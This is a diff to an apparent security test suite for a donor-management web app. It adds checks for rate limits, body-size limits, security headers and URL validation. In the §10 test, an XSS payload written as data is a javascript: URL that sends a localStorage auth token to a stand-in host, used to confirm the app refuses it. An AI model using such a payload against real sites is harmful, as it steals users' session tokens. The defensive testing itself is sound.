@@ -15,6 +15,11 @@
 //       a real signing secret.
 //   §6  The no-login cancel link expires, and a staff reset token is stored
 //       only as its hash (the stored value is not itself a working token).
+//   §7  Invite links and import previews have their own rate limits.
+//   §8  A large request body is read only for someone signed in.
+//   §9  Every API answer carries nosniff, Referrer-Policy, HSTS and a
+//       frame-ancestors policy; a CORS preflight is cached.
+//   §10 A stored website is http(s) or nothing; never javascript:.
 //
 // Standard scratch stack (tests/README.md). Fixtures are the suite's own org.
 
@@ -35,10 +40,18 @@ const EVIL_SVG = Buffer.from(`<svg xmlns="http://www.w3.org/2000/svg" width="10"
 
 async function fixtures() {
   for (const t of ["password_reset_tokens"]) await q(`DELETE FROM ${t} WHERE user_id IN ($1,$2)`, [ADMIN, STAFF]).catch(() => {});
-  for (const t of ["receipts", "gifts", "grants", "interactions", "donors", "portal_assets", "user_sessions", "users"])
-    await q(`DELETE FROM ${t} WHERE org_id=$1`, [ORG]).catch(() => {});
+  // Every table that carries an org_id, discovered, twice over (children first
+  // the second time round); append-only audit rows simply stay.
+  const tables = (await q(`SELECT table_name FROM information_schema.columns WHERE column_name='org_id' AND table_schema='public'`)).map(r => r.table_name);
+  for (let pass = 0; pass < 2; pass++)
+    for (const t of tables) await q(`DELETE FROM "${t}" WHERE org_id=$1`, [ORG]).catch(() => {});
   await q(`DELETE FROM orgs WHERE id=$1`, [ORG]).catch(() => {});
-  await q(`INSERT INTO orgs (id,name,org_slug,onboarding_complete,subscription_status,plan) VALUES ($1,'Secure One Food Pantry','secure-one-pantry',1,'trialing','team')`, [ORG]);
+  if ((await q(`SELECT 1 FROM orgs WHERE id=$1`, [ORG])).length) {
+    // A row we could not remove (append-only audit): keep the org, reset its users.
+    await q(`DELETE FROM users WHERE org_id=$1`, [ORG]).catch(() => {});
+  }
+  await q(`INSERT INTO orgs (id,name,org_slug,onboarding_complete,subscription_status,plan) VALUES ($1,'Secure One Food Pantry','secure-one-pantry',1,'trialing','team')
+           ON CONFLICT (id) DO UPDATE SET website=NULL, subscription_status='trialing', plan='team'`, [ORG]);
   const hash = bcrypt.hashSync("loadtest1234", 10);
   await q(`INSERT INTO users (id,org_id,email,password_hash,name,role) VALUES ($1,$2,$3,$4,'Renata Okafor','admin')`, [ADMIN, ORG, ADMIN_EMAIL, hash]);
   await q(`INSERT INTO users (id,org_id,email,password_hash,name,role) VALUES ($1,$2,$3,$4,'Dale Whitcombe','staff')`, [STAFF, ORG, STAFF_EMAIL, hash]);
@@ -141,6 +154,55 @@ async function fixtures() {
     ok("the reset token is stored as a hash", !!row && /^h1:[0-9a-f]{64}$/.test(row.token), row && row.token.slice(0, 6));
     const replay = await api("POST", "/auth/reset-password", null, { token: row ? row.token : "x", password: "hijacked12345" });
     ok("the stored value is not a working reset token", replay.status === 400, { status: replay.status });
+  }
+
+  console.log("\n§7 · invite links and import previews have their own limits");
+  {
+    const enforce = { "x-test-enforce-limits": "1" };
+    let firstInvite429 = 0;
+    for (let i = 1; i <= 32 && !firstInvite429; i++) {
+      const r = await fetch(`${BASE}/auth/invite/${crypto.randomBytes(16).toString("hex")}`, { headers: enforce });
+      if (r.status === 429) firstInvite429 = i;
+    }
+    ok("guessing invite links meets a 429 within 31 tries", firstInvite429 > 0 && firstInvite429 <= 31, firstInvite429);
+    let firstImport429 = 0;
+    for (let i = 1; i <= 62 && !firstImport429; i++) {
+      const r = await fetch(`${BASE}/history-import/preview`, { method: "POST", headers: { ...enforce, "Content-Type": "application/json", Authorization: "Bearer " + staff }, body: "{}" });
+      if (r.status === 429) firstImport429 = i;
+    }
+    ok("import previews meet a 429 within 61 tries", firstImport429 > 0 && firstImport429 <= 61, firstImport429);
+  }
+
+  console.log("\n§8 · a large body is read only for someone signed in");
+  {
+    const big = JSON.stringify({ rows: [{ note: "x".repeat(8 * 1024 * 1024) }] });
+    const anon = await fetch(`${BASE}/history-import/preview`, { method: "POST", headers: { "Content-Type": "application/json" }, body: big });
+    ok("an 8 MB body with no session is refused before parsing (413)", anon.status === 413, anon.status);
+    const signed = await fetch(`${BASE}/history-import/preview`, { method: "POST", headers: { "Content-Type": "application/json", Authorization: "Bearer " + admin }, body: big });
+    ok("…and the same body from a signed-in admin is read (not 413)", signed.status !== 413, signed.status);
+  }
+
+  console.log("\n§9 · every API answer carries the security headers; preflights are cached");
+  {
+    const r = await fetch(`${BASE}/health`);
+    ok("nosniff", r.headers.get("x-content-type-options") === "nosniff");
+    ok("Referrer-Policy", r.headers.get("referrer-policy") === "strict-origin-when-cross-origin", r.headers.get("referrer-policy"));
+    ok("HSTS", /max-age=\d{7,}/.test(r.headers.get("strict-transport-security") || ""), r.headers.get("strict-transport-security"));
+    ok("frame-ancestors limits who may frame a page", /frame-ancestors 'self'/.test(r.headers.get("content-security-policy") || "") && !/\*/.test(r.headers.get("content-security-policy") || ""), r.headers.get("content-security-policy"));
+    ok("no X-Powered-By", !r.headers.get("x-powered-by"));
+    const pre = await fetch(`${BASE}/donors`, { method: "OPTIONS", headers: { Origin: "https://www.stewardapp.dev", "Access-Control-Request-Method": "GET", "Access-Control-Request-Headers": "authorization" } });
+    ok("a preflight is cached (Access-Control-Max-Age)", Number(pre.headers.get("access-control-max-age")) >= 600, pre.headers.get("access-control-max-age"));
+  }
+
+  console.log("\n§10 · a stored website is a web address and nothing else");
+  {
+    const bad = await api("PATCH", `/orgs/${ORG}`, admin, { website: "javascript:fetch('//x.invalid/?'+localStorage.npe_token)" });
+    ok("a javascript: website is refused (400)", bad.status === 400, { status: bad.status, body: bad.body });
+    const [o] = await q(`SELECT website FROM orgs WHERE id=$1`, [ORG]);
+    ok("…and nothing was stored", !o.website || !/^javascript:/i.test(o.website), o.website);
+    const good = await api("PATCH", `/orgs/${ORG}`, admin, { website: "secureonepantry.org" });
+    const [o2] = await q(`SELECT website FROM orgs WHERE id=$1`, [ORG]);
+    ok("a bare domain is kept, as https", good.status === 200 && o2.website === "https://secureonepantry.org", { status: good.status, website: o2.website });
   }
 
   summary();
